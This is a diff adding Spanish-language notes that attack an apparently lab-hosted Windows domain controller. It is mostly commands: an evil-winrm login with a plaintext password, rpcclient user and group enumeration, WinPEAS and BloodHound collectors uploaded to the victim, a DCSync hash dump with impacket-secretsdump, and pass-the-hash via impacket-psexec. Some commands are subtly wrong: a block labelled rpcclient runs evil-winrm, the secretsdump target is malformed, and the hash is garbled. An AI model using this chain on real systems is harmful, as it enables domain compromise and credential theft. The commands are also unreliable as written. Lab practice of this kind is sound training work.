@@ -113,3 +113,62 @@ evil-winrm -i 10.10.10.175 -u 'fsmit' -p 'Thestrokes23'
 # Acceso a consola evil-winrm. Credenciales válidas y servicio de administración remota  
 evil-winrm -i 10.10.10.175 -u 'fsmit' -p 'Thestrokes23'
 ```
+
+```bash
+# Acceso a consola rpcclient. Credenciales válidas y SMB. Despues  enumdomusers  
+evil-winrm -i 10.10.10.175 -u 'fsmit' -p 'Thestrokes23'
+# enumer usuarios del dominio
+rpcclient $> enumdomusers
+# enumer grupos 
+rpcclient $> enumdomgroups
+# enumer usuarios de un grupo
+rpcclient $> querygroupmem 0x200
+# enumer info de un usuario
+rpcclient $> queryuser 0x1f4
+# Descripciones de los usuarios
+rpcclient $> querydispinfo
+```
+## Escalada de privilegios
+
+### WinPEAS
+
+Subir WinPEAS.exe a la máquina victima y ejecutarlo. Podemos obtener credenciales de autologon.
+
+### BloodHound
+
+Instalar en la maquina atacante neo4j y bloodhound. Previmente instalar Java 11.
+
+```bash
+# Instalación  
+sudo apt install neo4j bloodhound
+
+# Setear versión de java por defecto a la 11
+sudo update-alternatives --config java
+
+# Lanzamos neo4j. Configuramos en http://localhost:7474
+sudo neo4j console &> /dev/null & disown
+
+# Abrimos bloodhound 
+sudo bloodhound &> /dev/null & disown
+```
+Buscamos un recolector y lo subimos a la maquina victima.
+
+En el caso de Poweshell SharpHound.ps
+
+### Ataque DCSync
+
+```bash
+# Dumpa los HASHSES
+impacket-secretsdump EGOTISTICAL-BANK.LOCAL/svc_loanmgr:10.10.10.175
+
+```
+
+### Pass de HASH
+
+Si hemos tenido suerte y tenemos el hash NTLM podemos hacer Pass the HASH con psexec.
+
+```bash
+# Pass the hash,
+impacket-psexec EGOTISTICAL-BANK.LOCAL/Administrator:10.10.10.175 cmd.exe -hashes :elhahsahnt
+
+```
